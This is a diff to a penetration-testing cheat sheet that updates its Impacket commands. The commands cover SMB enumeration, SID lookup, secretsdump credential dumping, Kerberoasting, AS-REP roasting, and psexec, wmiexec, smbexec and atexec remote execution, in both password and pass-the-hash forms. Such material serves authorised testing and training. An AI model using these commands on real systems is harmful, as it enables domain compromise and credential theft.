@@ -580,31 +580,47 @@ admin@123
 ## Impacket
 
 ```bash
-smbclient.py [domain]/[user]:[password/password hash]@[Target IP Address] #we connect to the server rather than a share
+impacket-smbclient 'DOMAIN/user:Password@TARGET'                                  # SMB client; connect first, then select share
+impacket-smbclient -hashes ':NTHASH' 'DOMAIN/user@TARGET'                        # SMB client PTH
 
-lookupsid.py [domain]/[user]:[password/password hash]@[Target IP Address] #User enumeration on target
+impacket-lookupsid 'DOMAIN/user:Password@TARGET'                                 # Enumerate SIDs/users
+impacket-lookupsid -hashes ':NTHASH' 'DOMAIN/user@TARGET'                        # SID enumeration PTH
 
-services.py [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action] #service enumeration
+impacket-services 'DOMAIN/user:Password@TARGET' list                             # Enumerate services
+impacket-services -hashes ':NTHASH' 'DOMAIN/user@TARGET' list                    # Enumerate services PTH
 
-secretsdump.py [domain]/[user]:[password/password hash]@[Target IP Address]  #Dumping hashes on target
+impacket-secretsdump 'DOMAIN/user:Password@TARGET'                               # Dump SAM/LSA/NTDS where privileges allow
+impacket-secretsdump -hashes ':NTHASH' 'DOMAIN/user@TARGET'                      # secretsdump PTH
 
-GetUserSPNs.py [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip <IP> -request  #Kerberoasting, and request option dumps TGS
+impacket-GetUserSPNs 'DOMAIN/user:Password' -dc-ip <DC_IP> -request               # Kerberoast / request TGS hashes
+impacket-GetUserSPNs 'DOMAIN/user:Password' -dc-ip <DC_IP> -request -outputfile tgs.hashes
 
-GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #Asreproasting, need to provide usernames list
+impacket-GetNPUsers 'DOMAIN/' -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile asrep.hashes  # AS-REP roast
 
-##RCE
-psexec.py test.local/john:password123@10.10.10.1
-psexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
+# RCE
+impacket-psexec 'DOMAIN/user:Password@TARGET'                                     # SMB service execution, often SYSTEM
+impacket-psexec -hashes ':NTHASH' 'DOMAIN/user@TARGET'                           # PsExec PTH
 
-wmiexec.py test.local/john:password123@10.10.10.1
-wmiexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
+impacket-wmiexec 'DOMAIN/user:Password@TARGET'                                   # WMI execution
+impacket-wmiexec -hashes ':NTHASH' 'DOMAIN/user@TARGET'                          # WMI PTH
 
-smbexec.py test.local/john:password123@10.10.10.1
-smbexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
+impacket-smbexec 'DOMAIN/user:Password@TARGET'                                   # SMB/service command execution
+impacket-smbexec -hashes ':NTHASH' 'DOMAIN/user@TARGET'                          # SMBExec PTH
 
-atexec.py test.local/john:password123@10.10.10.1 <command>
-atexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 <command>
+impacket-atexec 'DOMAIN/user:Password@TARGET' '<COMMAND>'                        # Scheduled-task execution
+impacket-atexec -hashes ':NTHASH' 'DOMAIN/user@TARGET' '<COMMAND>'               # ATExec PTH
 
+```
+
+```bash
+impacket-psexec 'DOMAIN/user:Password@10.10.10.10'                         # Domain password
+impacket-psexec './Administrator:Password@10.10.10.10'                    # Local password
+impacket-psexec -hashes ':NTLM_HASH' 'Administrator@10.10.10.10'         # Local PTH
+impacket-psexec -hashes ':NTLM_HASH' 'DOMAIN/Administrator@10.10.10.10'  # Domain PTH
+impacket-psexec -k -no-pass 'DOMAIN/user@hostname'                        # Kerberos ticket
+impacket-psexec -dc-ip <DC_IP> 'DOMAIN/user:Password@HOST'                # Specify DC
+impacket-psexec 'DOMAIN/user:Password@HOST' 'whoami'                      # Run command
+# Success often → nt authority\system
 ```
 
 ## Evil-Winrm
